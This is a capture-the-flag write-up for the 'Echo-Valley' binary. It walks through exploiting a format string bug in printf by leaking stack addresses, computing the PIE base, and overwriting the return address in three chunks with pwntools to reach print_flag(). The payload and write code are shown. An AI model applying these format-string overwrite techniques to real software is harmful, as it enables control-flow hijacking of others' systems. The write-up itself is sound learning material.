# Echo-Valley Writeup

**Flag:** *(output from running exploit.py)*

---

## Summary

The binary has a format string vulnerability in `printf(buf)` inside a loop. There are no format specifiers, so we can leak stack values and overwrite the return address to hijack control flow.

---

## Exploit Strategy

### Step 1: Leak return address and PIE base

`echo_valley()` is called from `main()`. We use format string specifiers to leak:

* `%20$p` → the return address (target for overwrite)
* `%21$p` → the instruction inside `main()` (used to calculate PIE base)

```python
payload_1 = b"%20$p::%21$p"
```

---

### Step 2: Calculate address of `print_flag()`

Using GDB, the offset from the leaked `%21$p` to `print_flag()` is `0x1AA`.
Subtract that to get the function’s real address:

```python
print_flag_addr = main_addr - 0x1AA
```

---

### Step 3: Write the address in 3 chunks

Since we’re dealing with a 64-bit address and limited format string space,
we split the address into three 2-byte writes (LSB-first):

```python
payload_chunk = [
    (print_flag_addr & 0xFFFF),
    ((print_flag_addr >> 16) & 0xFFFF),
    ((print_flag_addr >> 32) & 0xFFFF)
]
```

We use pwntools’ `fmtstr_payload(6, {...})` to write each chunk to the return address:

```python
conn.sendline(fmtstr_payload(6, {return_addr_overwrite: payload_chunk[0]}))
conn.sendline(fmtstr_payload(6, {return_addr_overwrite + 2: payload_chunk[1]}))
conn.sendline(fmtstr_payload(6, {return_addr_overwrite + 4: payload_chunk[2]}))
```

---

### Step 4: Trigger return

Send `exit\n` to break the loop. Since we overwrote the return address,
execution jumps to `print_flag()`.

---

## Key Points

* `%20$p` → return address to overwrite
* `%21$p` → leaked instruction in `main()`, used to calculate offset
* Offset to `print_flag()` = `0x1AA`
* Return address written in 3 x 2-byte chunks using `%hn`
* `exit` forces return to hijacked address, triggering flag print

---

## Reflections

This challenge took over 15 hours.
Learned how format string bugs work under PIE, how to precisely write multi-byte addresses,
and how to stitch it together into a working exploit.
Built it from scratch using `pwntools`, GDB, and raw persistence.
